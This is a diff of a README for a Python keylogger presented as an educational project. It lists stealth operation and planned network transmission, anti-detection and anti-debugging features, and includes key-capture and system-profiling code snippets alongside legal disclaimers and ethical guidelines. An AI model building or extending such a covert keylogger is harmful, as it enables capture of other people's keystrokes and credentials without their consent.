@@ -1,99 +1,103 @@
-# Python Keylogger - Educational Project
+ Python Keylogger - Educational Project
 
 **A Python-based keylogger implementation demonstrating keyboard monitoring and system information collection. For educational/research purposes only.**
 
+⚠️ **Important Legal Disclaimer** ⚠️  
+This project is intended **strictly for educational purposes**. Unauthorized use to monitor devices without explicit permission is illegal. Developers assume no liability for misuse.
+
 ## Features
-- **Keystroke Logging**: Records all keyboard inputs with timestamps
-- **System Information Collection**: Captures hostname, IP addresses, OS details, and processor info
-- **Stealth Logging**: Runs in background with minimal visibility
-- **Error Handling**: Robust exception handling for stable operation
-- **Cross-Platform**: Works on Windows, Linux, and macOS
+- **Keystroke Logging**: Records keyboard inputs with timestamps
+- **System Metadata Capture**: Collects hostname, IP addresses, and hardware specs
+- **Special Key Handling**: Detects Enter/Space/Backspace
+- **Stealth Operation**: Runs with minimal system visibility
+- **Cross-Platform**: Compatible with Windows, macOS, and Linux
+- **Error Resilience**: Robust exception handling
 
 ## Project Structure
-- **Logging Configuration**: Customizable log format and storage
-- **System Info Module**: Collects comprehensive device metadata
-- **Key Press Handler**: Special key detection (Enter, Space, Backspace)
-- **Listener Setup**: Non-blocking keyboard listener implementation
+- `keylogger.py`: Core logging implementation
+- **Modules**:
+  - **System Profiler**: Hardware/network data collection
+  - **Key Listener**: Keyboard input monitoring
+  - **Log Manager**: Secure data storage handling
 
-## How to Run
-
-### Prerequisites
+## Prerequisites
 - Python 3.6+
-- Administrative privileges (for some systems)
+- Administrative privileges (recommended)
+- Network connection (for public IP detection)
 
-### Installation
-1. Clone the repository:
+## Installation & Usage
+1. **Clone repository**:
 ```bash
-git clone https://github.com/sabihhuda/Keylogger-Phyton.git
+git clone https://github.com/yourusername/python-keylogger.git
 cd python-keylogger
-Install dependencies:
-
+2. **Install dependencies**:
 bash
 Copy
 pip install pynput requests
-Run the keylogger:
-
+3. **Run keylogger**:
 bash
 Copy
 python keylogger.py
-Configuration
-Modify LOG_DIRECTORY to change log file location
+Logs will be saved to key_log.txt in the project directory.
 
-Adjust logging level in logging.basicConfig
+**Configuration**
+Customize in keylogger.py:
+python
+Copy
+# Change log location
+LOG_DIRECTORY = "/path/to/custom/folder/"
 
-Add/remove system information fields in collect_system_info()
-
-Sample Code Snippets
+# Modify logging format
+logging.basicConfig(
+    format="[%(asctime)s] %(message)s",
+    datefmt="%d-%b-%Y %H:%M:%S"
+)
+Code Snippets
 1. System Information Collection
 python
 Copy
 def collect_system_info():
+    """Gather device metadata"""
     hostname = socket.gethostname()
-    IPAddr = socket.gethostbyname(hostname)
-    logging.info(f"OS: {platform.system()} {platform.version()}")
-    logging.info(f"Processor: {platform.processor()}")
+    logging.info(f"OS Version: {platform.system()} {platform.release()}")
+    logging.info(f"Architecture: {platform.machine()}")
 2. Key Press Handler
 python
 Copy
 def on_key_press(key):
-    if key == Key.space:
-        logging.info(" ")
-    elif key == Key.enter:
-        logging.info("[ENTER]")
-    else:
-        logging.info(str(key).replace("'", ""))
-Project Flow
-Initialization: Setup logging configuration
+    """Process keyboard input"""
+    try:
+        if key == Key.space:
+            logging.info("[SPACE]")
+        elif key == Key.enter:
+            logging.info("[ENTER]")
+        else:
+            logging.info(str(key).replace("'", ""))
+    except Exception as e:
+        logging.error(f"Key processing error: {str(e)}")
+Ethical Guidelines
+🛑 Legal Compliance: Always obtain written consent before testing
 
-System Snapshot: Collect hardware/network information
+🔐 Data Security: Treat logs as sensitive information
 
-Listener Start: Begin monitoring keyboard input
+⚠️ Responsible Disclosure: Never deploy on unauthorized systems
 
-Real-time Logging: Write keystrokes to log file
+🧹 Cleanup: Remove all logs after educational use
 
-Clean Shutdown: Graceful termination on exit
+Future Enhancements
+GUI configuration panel
 
-Ethical Considerations
-🔒 Legal Compliance: Always obtain explicit consent before monitoring
+Log file encryption
 
-🛡️ Data Protection: Log files contain sensitive information - handle securely
+Network transmission module
 
-⚠️ Responsible Use: Strictly for educational/authorized security research
-
-Future Improvements
-GUI interface for configuration
-
-Log encryption implementation
-
-Network transmission capabilities
-
-Anti-detection mechanisms
+Anti-debugging techniques
 
 Usage time limitations
 
 License
-This project is licensed under the MIT License - see LICENSE file for details
+MIT License - See LICENSE for details
 
 Contact
 For educational inquiries: sabihhuda3@gmail.com
-Note: This project is not maintained for actual usage - created purely for demonstration purposes.
+Note: This project is not maintained for production use - created purely for academic demonstration.
